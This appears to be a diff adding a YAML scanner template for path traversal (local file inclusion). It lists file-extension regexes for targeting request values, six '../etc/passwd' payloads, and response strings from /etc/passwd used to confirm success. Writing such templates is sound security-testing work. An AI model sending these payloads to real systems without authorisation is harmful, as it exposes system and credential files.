@@ -1,0 +1,117 @@
+bug-name: "Path Traversal"
+bug-type: "lfi"
+target-arguments:
+  - type: "regex"
+    target: "value"
+    part: "all"
+    regexes: 
+      - ^.*\.action$
+      - ^.*\.adr$
+      - ^.*\.ascx$
+      - ^.*\.asmx$
+      - ^.*\.axd$
+      - ^.*\.backup$
+      - ^.*\.bak$
+      - ^.*\.bkf$
+      - ^.*\.bkp$
+      - ^.*\.bok$
+      - ^.*\.achee$
+      - ^.*\.cfg$
+      - ^.*\.cfm$
+      - ^.*\.cgi$
+      - ^.*\.cnf$
+      - ^.*\.conf$
+      - ^.*\.config$
+      - ^.*\.crt$
+      - ^.*\.csr$
+      - ^.*\.csv$
+      - ^.*\.dat$
+      - ^.*\.doc$
+      - ^.*\.docx$
+      - ^.*\.eml$
+      - ^.*\.env$
+      - ^.*\.exe$
+      - ^.*\.gz$
+      - ^.*\.ica$
+      - ^.*\.inf$
+      - ^.*\.ini$
+      - ^.*\.java$
+      - ^.*\.json$
+      - ^.*\.key$
+      - ^.*\.log$
+      - ^.*\.lst$
+      - ^.*\.mai$
+      - ^.*\.mbox$
+      - ^.*\.mbx$
+      - ^.*\.md$
+      - ^.*\.png$
+      - ^.*\.mdb$
+      - ^.*\.nsf$
+      - ^.*\.old$
+      - ^.*\.ora$
+      - ^.*\.pac$
+      - ^.*\.passwd$
+      - ^.*\.pcf$
+      - ^.*\.jpg$
+      - ^.*\.pdf$
+      - ^.*\.pem$
+      - ^.*\.pgp$
+      - ^.*\.pl$
+      - ^.*\.plist$
+      - ^.*\.pwd$
+      - ^.*\.rdp$
+      - ^.*\.reg$
+      - ^.*\.rtf$
+      - ^.*\.skr$
+      - ^.*\.sql$
+      - ^.*\.swf$
+      - ^.*\.tpl$
+      - ^.*\.txt$
+      - ^.*\.url$
+      - ^.*\.wml$
+      - ^.*\.xls$
+      - ^.*\.xlsx$
+      - ^.*\.xml$
+      - ^.*\.gif$
+      - ^.*\.xsd$
+      - ^.*\.yml$
+number-of-flow: 2
+flows:
+  match-condition: "all"
+  flow_1:
+    endpoint: "{{base_url}}"
+    payloads:
+      - value: "../../../etc/passwd"
+        position: "replace"
+        tag: "linux"
+      
+      - value: "../../../../etc/passwd"
+        position: "replace"
+        tag: "linux"
+      
+      - value: "../../../../../etc/passwd"
+        position: "replace"
+        tag: "linux"
+
+      - value: "../../../../../../etc/passwd"
+        position: "replace"
+        tag: "linux"
+
+      - value: "/etc/passwd"
+        position: "replace"
+        tag: "linux"
+
+      - value: "../../../etc/passwd .png"
+        position: "replace"
+        tag: "linux"
+    verify:
+      - function: "contains_any"
+        args:
+          wordlist:
+            - "daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin"
+            - "colord:x:114:122:colord\ncolour"
+            - "System"
+            - "Resolver,,,:/run/systemd:/usr/sbin/nologin\nmysql:x:106:107:MySQL"
+            - "daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin"
+            - "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin"
+        expected-value: True
